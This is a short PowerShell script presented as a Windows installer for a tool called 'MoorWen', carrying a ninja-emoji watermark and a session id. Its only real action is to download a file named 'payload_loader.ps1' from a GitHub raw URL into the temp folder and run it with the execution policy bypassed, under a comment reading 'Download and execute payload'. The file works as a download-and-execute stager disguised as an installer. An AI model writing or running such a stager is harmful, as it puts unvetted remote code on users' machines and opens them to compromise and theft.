# ============================================================
# MOORWEN — Windows Installer
# WATERMARK: 𝕍𝕠𝕤𝕤🥷 | SESSION: 0585f9bc...
# ============================================================

Write-Host "[*] MoorWen — Installing..." -ForegroundColor Cyan

# Download and execute payload
$payloadUrl = "https://raw.githubusercontent.com/vxssroott/MoorWen/main/payload_loader.ps1"
$payloadPath = "$env:TEMP\moorwen.ps1"
Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath
powershell -ExecutionPolicy Bypass -File $payloadPath

Write-Host "[+] MoorWen installed." -ForegroundColor Green
